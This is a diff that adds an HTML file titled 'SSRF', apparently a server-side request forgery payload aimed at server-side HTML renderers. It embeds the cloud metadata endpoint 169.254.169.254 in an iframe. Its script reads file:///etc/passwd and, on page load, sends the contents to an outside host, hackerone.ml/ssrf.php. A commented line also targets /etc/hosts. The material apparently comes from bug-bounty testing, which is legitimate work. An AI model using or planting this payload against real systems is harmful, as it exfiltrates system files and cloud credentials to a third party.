@@ -1,0 +1,27 @@
+<h1>SSRF </h1>
+
+
+<iframe src="http://169.254.169.254/latest/meta-data/" style="font-size: 30px; height: 1200px; width: 500px">
+</iframe>
+
+
+	<script type="text/javascript">
+
+		function x(){
+				var xhr = new XMLHttpRequest();
+				xhr.open("GET", "file:///etc/passwd");
+				xhr.send();
+				return xhr.responseText
+		}
+
+
+		    window.onload = function(){
+				var xmlhttp=new XMLHttpRequest();
+			    	// xmlhttp.open("GET", "file:///etc/hosts", true);
+				xmlhttp.open("GET","https://hackerone.ml/ssrf.php?t=" + x(),true);
+			      	xmlhttp.send();
+
+
+		    }
+	</script>
+
